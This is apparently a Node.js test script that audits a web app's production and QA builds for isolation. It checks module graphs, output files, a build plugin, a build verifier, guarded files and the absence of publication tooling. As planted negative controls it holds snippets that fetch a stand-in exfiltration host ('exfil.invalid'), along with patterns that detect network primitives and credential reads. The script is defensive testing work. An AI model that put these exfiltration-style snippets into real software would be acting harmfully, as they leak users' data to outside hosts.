// QA01 isolation audit. Builds the ordinary production app and the synthetic QA build, then proves:
//   1. production: no QA/gate/tooling module in its graph, and (with QA01_BASELINE_DIST) byte-identical output;
//   1b. the Canvas production build (LUMEN_CANVAS=1): no QA/gate/tooling module either, Canvas styles and Routing Center present;
//   2. QA: no Firebase/sync/service-worker/proof/test/server module, the adapters present, output audited;
//   3. the auditors, the build plugin and the verifier each catch deliberately planted violations;
//   4. production entry, hosting/rules/relay/workflows unchanged since QA01_BASE except the reviewed Canvas activation;
//   5. local QA tooling cannot publish: no network clients, credentials or deployment workflow.
//   QA01_BASELINE_DIST=/tmp/baseline node tests/security/private-qa-isolation.mjs

import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { build } from 'vite';
import { PRODUCTION_GRAPH_FORBIDDEN, QA_GRAPH_FORBIDDEN, QA_GRAPH_REQUIRED, auditGraph, auditOutput, listFiles } from '../../scripts/qa/audit.mjs';
import { verifyBuild } from '../../scripts/qa/verify.mjs';
import { qaIsolation } from '../../vite.qa.config.ts';

const root = process.cwd();
// The main commit Canvas activation branched from (needs full history: fetch-depth 0 in CI).
const base = process.env.QA01_BASE || '655438f0ec8d2e3594595252af4a99e6c58627a0';
const work = mkdtempSync(join(tmpdir(), 'lumen-qa01-isolation-'));
const report = { base, checks: [] };
const pass = (name, detail = '') => { report.checks.push(name); console.log(`PASS ${name}${detail ? ` — ${detail}` : ''}`); };
const hashes = (dir) => Object.fromEntries(listFiles(dir).map((f) => [f, createHash('sha256').update(readFileSync(join(dir, f))).digest('hex')]));
const observe = (sink) => ({ name: 'qa01-graph-observer', generateBundle() { sink.push(...this.getModuleIds()); } });

try {
  // 1. Ordinary production build.
  const productionIds = [];
  const production = join(work, 'production');
  await build({ logLevel: 'warn', build: { outDir: production, emptyOutDir: true }, plugins: [observe(productionIds)] });
  auditGraph(productionIds, { forbidden: PRODUCTION_GRAPH_FORBIDDEN });
  const productionHashes = hashes(production);
  // Byte equality needs a pre-change baseline build; without one the run fails unless the skip is explicit.
  if (process.env.QA01_BASELINE_DIST) assert.deepEqual(productionHashes, hashes(resolve(process.env.QA01_BASELINE_DIST)), 'ordinary output must be byte-identical to the pre-QA01 baseline');
  else if (process.env.QA01_ALLOW_NO_BASELINE !== '1') throw new Error('Set QA01_BASELINE_DIST to a production build of the base commit (or QA01_ALLOW_NO_BASELINE=1 to skip byte equality explicitly).');
  else console.log('SKIP production byte equality (explicitly allowed; no baseline given)');
  pass('production graph excludes QA code', `${productionIds.length} modules, ${Object.keys(productionHashes).length} files, baseline equality: ${Boolean(process.env.QA01_BASELINE_DIST)}`);

  // 1b. Canvas production build: the same config with LUMEN_CANVAS=1. It must take the shared "on" module, never a QA file.
  const canvasIds = [];
  const canvas = join(work, 'canvas');
  const previous = process.env.LUMEN_CANVAS;
  process.env.LUMEN_CANVAS = '1';
  try {
    await build({ logLevel: 'warn', build: { outDir: canvas, emptyOutDir: true }, plugins: [observe(canvasIds)] });
  } finally {
    if (previous === undefined) delete process.env.LUMEN_CANVAS; else process.env.LUMEN_CANVAS = previous;
  }
  auditGraph(canvasIds, { forbidden: PRODUCTION_GRAPH_FORBIDDEN, required: ['src/lib/canvas-presentation.on.ts', 'src/styles/canvas-screens.css', 'src/components/RoutingCenter.tsx', 'src/components/SidebarCanvas.tsx'], root });
  assert.ok(!canvasIds.some((id) => id.replaceAll('\\', '/').split('?')[0].endsWith('/src/lib/canvas-presentation.ts')), 'the Canvas build replaces the off switch');
  assert.ok(!productionIds.some((id) => /canvas-presentation\.on\.ts|\/RoutingCenter\.tsx|\/styles\/canvas/.test(id)), 'the ordinary build never reaches the "on" module');
  pass('Canvas production build excludes QA code', `${canvasIds.length} modules`);

  // 2. Synthetic QA build.
  const qaIds = [];
  const qa = join(work, 'qa');
  await build({ configFile: join(root, 'vite.qa.config.ts'), logLevel: 'warn', build: { outDir: qa, emptyOutDir: true }, plugins: [observe(qaIds)] });
  auditGraph(qaIds, { forbidden: QA_GRAPH_FORBIDDEN, required: QA_GRAPH_REQUIRED, root });
  const { files, network } = auditOutput(qa);
  pass('QA graph and output audited', `${qaIds.length} modules, ${files.length} files, ${network.length} reviewed third-party network chunks`);
  report.qaNetworkChunks = network;

  // 3a. Planted graph violations.
  const planted = ['node_modules/firebase/app/dist/esm/index.esm.js', 'node_modules/@firebase/firestore/dist/index.esm.js', 'src/lib/firebase.ts', 'src/lib/sync.ts?v=1', 'src/pwa/sw.js',
    'src/pwa/register.ts', 'src/firebase-config.json', 'docs/blackout/workspace-proofs/bootstrap.ts', 'tests/e2e/helpers/preview-profile.cjs', 'server/private-qa/gate.mjs', 'server/provider-relay/worker.mjs'];
  for (const id of planted) assert.throws(() => auditGraph([...qaIds, join(root, id)], { forbidden: QA_GRAPH_FORBIDDEN }), { code: 'forbidden_module' }, id);
  assert.throws(() => auditGraph(qaIds.filter((id) => !id.endsWith('qa/iphone/adapters/transport.ts')), { forbidden: QA_GRAPH_FORBIDDEN, required: QA_GRAPH_REQUIRED, root }), { code: 'missing_module' });
  for (const id of ['qa/iphone/main.tsx', 'server/private-qa/gate.mjs', 'scripts/qa/build.mjs', 'vite.qa.config.ts']) {
    assert.throws(() => auditGraph([...productionIds, join(root, id)], { forbidden: PRODUCTION_GRAPH_FORBIDDEN }), { code: 'forbidden_module' }, id);
  }
  pass('graph auditors reject planted modules', `${planted.length} QA + 4 production negative controls, 1 missing-adapter control`);

  // 3b. Planted output violations.
  for (const [name, content] of [['assets/evil-1.js', 'fetch("https://exfil.invalid")'], ['assets/evil-5.js', 'window.fetch("https://exfil.invalid")'],
    ['assets/evil-6.js', 'const f=globalThis.fetch.bind(globalThis);f("https://exfil.invalid")'], ['assets/evil-7.js', 'self.fetch.call(self,"https://exfil.invalid")'], ['assets/evil-2.js', 'x="the-model-router.firebaseapp.com"'], ['assets/evil-3.js', 'navigator.serviceWorker.register("/sw.js")'],
    ['assets/evil-4.js', 'new XMLHttpRequest()'], ['sw.js', 'self.oninstall=1'], ['assets/app.js.map', '{}'], ['assets/evil.wasm', '']]) {
    const dir = join(work, `planted-${name.replace(/\W/g, '_')}`);
    cpSync(qa, dir, { recursive: true });
    mkdirSync(join(dir, 'assets'), { recursive: true });
    writeFileSync(join(dir, name), content);
    assert.throws(() => auditOutput(dir), { code: 'output' }, name);
  }
  pass('output auditor rejects planted files', '10 negative controls incl. indirect fetch and a second native capture');

  // 3c. The build plugin refuses forbidden imports in real builds, and rewrites/blocks primitives.
  for (const [label, source] of [['firebase/storage', "import 'firebase/storage';"], ['Firebase configuration', `import ${JSON.stringify(join(root, 'src/firebase-config.json'))};`],
    ['test helper', `import ${JSON.stringify(join(root, 'tests/e2e/helpers/preview-profile.cjs'))};`], ['service worker source', `import ${JSON.stringify(join(root, 'src/pwa/sw.js?raw'))};`]]) {
    const dir = mkdtempSync(join(work, 'plant-'));
    writeFileSync(join(dir, 'index.html'), '<!doctype html><script type="module" src="./main.js"></script>');
    writeFileSync(join(dir, 'main.js'), source);
    await assert.rejects(build({ configFile: false, root: dir, logLevel: 'silent', plugins: [qaIsolation()], build: { outDir: join(dir, 'out'), write: false } }), /QA build: (unsupported Firebase import|forbidden module)/, label);
  }
  {
    // Replacement wins even for ?raw: the import resolves to the adapter (no default export), so the
    // build fails rather than ever reading the real sync source.
    const dir = mkdtempSync(join(work, 'plant-'));
    writeFileSync(join(dir, 'index.html'), '<!doctype html><script type="module" src="./main.js"></script>');
    writeFileSync(join(dir, 'main.js'), `import s from ${JSON.stringify(join(root, 'src/lib/sync.ts?raw'))}; console.log(s);`);
    await assert.rejects(build({ configFile: false, root: dir, logLevel: 'silent', plugins: [qaIsolation()], build: { outDir: join(dir, 'out'), write: false } }),
      (e) => /Missing export|default/i.test(String(e.message)) && /qa\/iphone\/adapters\/sync\.ts/.test(String(e.message)));
  }
  const plugin = qaIsolation();
  const fail = { error(message) { throw new Error(message); } };
  const srcId = join(root, 'src/lib/planted.ts');
  for (const code of ['new XMLHttpRequest()', 'new WebSocket("wss://x")', 'new EventSource("/x")', 'navigator.sendBeacon("/x")', 'navigator.serviceWorker.register("/sw.js")',
    'window.fetch("https://x")', 'globalThis.fetch(u)', 'self.fetch(u)', 'fetch.call(null, u)', 'const f = fetch;', 'run({ fetch })', 'use(fetch, u)']) {
    assert.throws(() => plugin.transform.call(fail, code, srcId), /QA build: .* network or service-worker primitive/, code);
  }
  const rewritten = plugin.transform.call(fail, 'const a = await fetch(url); obj.fetch(x); const w = new Worker(new URL("./x.worker.ts", import.meta.url), { type: "module" });', srcId).code;
  assert.match(rewritten, /__qaFetch\(url\)/);
  assert.match(rewritten, /obj\.fetch\(x\)/);
  assert.match(rewritten, /__qaWorker\(null, \{ type: "module" \}\)/);
  assert.ok(!/new URL\("\.\/x\.worker\.ts"/.test(rewritten));
  assert.equal(plugin.transform.call(fail, 'fetch(x)', join(root, 'node_modules/lib/index.js')), null, 'third-party code is audited, not rewritten');
  pass('QA build plugin refuses planted imports and primitives', '4 real planted builds, ?raw replacement, 12 primitive/indirect-fetch controls, rewrite checks');

  // 3d. The verifier rejects tampered, extra-file and wrong-commit builds.
  const head = execFileSync('git', ['rev-parse', 'HEAD'], { encoding: 'utf8' }).trim();
  if (process.env.QA_BUILD_DIR) {
    const good = resolve(process.env.QA_BUILD_DIR);
    assert.deepEqual(await verifyBuild(good, head), []);
    const copy = (name) => { const dir = join(work, name); cpSync(good, dir, { recursive: true }); return dir; };
    const tampered = copy('tampered');
    writeFileSync(join(tampered, 'site/index.html'), '<!doctype html><title>tampered</title>');
    assert.ok((await verifyBuild(tampered, head)).some((p) => /index\.html: digest mismatch/.test(p)));
    const extra = copy('extra');
    writeFileSync(join(extra, 'site/assets/extra.js'), '1');
    assert.ok((await verifyBuild(extra, head)).some((p) => /extra\.js: not in the manifest/.test(p)));
    assert.ok((await verifyBuild(good, 'f'.repeat(40))).some((p) => /is not the expected/.test(p)));
    assert.ok((await verifyBuild(good, head, Date.now() + 73 * 3600_000)).includes('build has expired'));
    pass('verifier accepts the pinned build and rejects tampered/extra/wrong-commit/expired', head.slice(0, 12));
  }

  // 4. Files QA01 must not change.
  const guarded = ['src', 'index.html', 'vite.config.ts', 'package.json', 'package-lock.json', 'firebase.json', '.firebaserc', 'firestore.rules', 'server/provider-relay',
    '.github', 'public'];
  // CP02/CP03 (owner-authorized) add the flagged Canvas composer and shell in exactly these source files. The flags
  // stay off in the ordinary build, and section 1's byte equality proves its output is still the pre-QA01 baseline.
  const cp02 = ['src/components/Composer.tsx', 'src/components/ComposerCanvas.tsx', 'src/lib/canvas-presentation.ts', 'src/styles/canvas-composer.css',
    'src/App.tsx', 'src/components/Sidebar.tsx', 'src/components/SidebarCanvas.tsx', 'src/components/ChatView.tsx', 'src/styles/canvas-shell.css',
    'src/components/RoutingCenter.tsx', 'src/lib/routing-center.ts', 'src/styles/canvas-routing.css',
    'src/styles/canvas-screens.css', 'src/styles/canvas.css', 'src/lib/workspace-presentation.ts',
    // Activation (owner-authorized 2026-10-22): the shared "on" module, its LUMEN_CANVAS selection, and the workflows
    // that set it (Deploy and Preview build Canvas by default) or test it.
    'src/lib/canvas-presentation.on.ts', 'vite.config.ts', '.github/workflows/deploy.yml', '.github/workflows/preview.yml', '.github/workflows/tests.yml'];
  const changed = execFileSync('git', ['diff', '--name-only', base, '--', ...guarded], { encoding: 'utf8' }).trim().split('\n').filter((f) => f && !cp02.includes(f));
  assert.deepEqual(changed, [], `only the reviewed Canvas files may change production entry, hosting, rules, relay or workflows:\n${changed.join('\n')}`);
  assert.match(readFileSync('src/lib/canvas-presentation.ts', 'utf8'), /^export const CANVAS_COMPOSER = false;$/m, 'the Canvas composer stays off in the ordinary build');
  assert.match(readFileSync('src/lib/canvas-presentation.ts', 'utf8'), /^export const CANVAS_SHELL = false;$/m, 'the Canvas shell stays off in the ordinary build');
  assert.match(readFileSync('src/lib/canvas-presentation.ts', 'utf8'), /^export const RoutingCenter: ComponentType \| null = null;$/m, 'the ordinary build has no Routing Center loader');
  pass('production entry, hosting/rules/relay unchanged; only the reviewed Canvas files (switch off by default) changed', `since ${base.slice(0, 12)}`);

  // 5. No-publication contract for the local tooling.
  const tooling = ['server/private-qa/gate.mjs', 'server/private-qa/control.mjs', 'server/private-qa/access-jwt.mjs', 'server/private-qa/paths.mjs', 'scripts/qa/build.mjs', 'scripts/qa/verify.mjs', 'scripts/qa/audit.mjs'];
  for (const file of tooling) {
    const text = readFileSync(file, 'utf8');
    // The auditor names these primitives in order to detect them; for it, check real imports/env reads only.
    if (file === 'scripts/qa/audit.mjs') { assert.ok(!/from 'node:(?:https?|net|dgram|child_process)'|process\.env/.test(text), `${file} must not open connections or read the environment`); continue; }
    assert.ok(!/(?<![\w$.])(?<!async )fetch\s*\(|node:https?|node:net|node:dgram|XMLHttpRequest|WebSocket|wrangler|CLOUDFLARE|R2_|ACCESS_TOKEN|API_TOKEN|process\.env\.(?!QA_OUT_DIR)/.test(text), `${file} must not contain network clients or credential reads`);
  }
  assert.ok(!listFiles('.github/workflows').some((f) => /qa/i.test(f)), 'no QA publication workflow exists');
  pass('local QA tooling has no network client, credential read or publication workflow', `${tooling.length} files`);

  writeFileSync(join(work, 'report.json'), JSON.stringify(report, null, 2));
  console.log(`PASS QA01 isolation audit (${report.checks.length} checks); report ${join(work, 'report.json')}`);
} finally {
  if (!process.env.QA01_KEEP) rmSync(work, { recursive: true, force: true });
}
